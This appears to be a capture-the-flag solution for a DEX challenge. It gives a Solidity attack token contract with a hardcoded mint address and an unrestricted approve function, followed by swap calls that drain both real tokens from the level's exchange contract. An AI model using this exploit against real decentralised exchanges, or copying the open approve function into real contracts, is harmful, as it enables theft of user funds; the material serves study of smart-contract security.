```javascript
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DEX2Token is ERC20 {
  constructor(string memory name, string memory symbol) public ERC20(name, symbol) {
        _mint(msg.sender, 10);
        _mint(0x57E8fa3d1e1B758C54A83E2DF3d93B7867a4c373, 10);
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    super._approve(owner, spender, amount);
  }
}
```

Deploy the contract 2 times to get Address1 and Address2.
Let `C` be the level's contract address.
Let `token1` and `token2` be the address of the underlying tokens in the contract.
We call `Address1.approve(C, 20)` and `Address2.approve(C, 20)` in Remix.

Finally, run the following:

```javascript
await contract.swap(Address1, token2, 10)

await contract.swap(Address2, token1, 10)
```
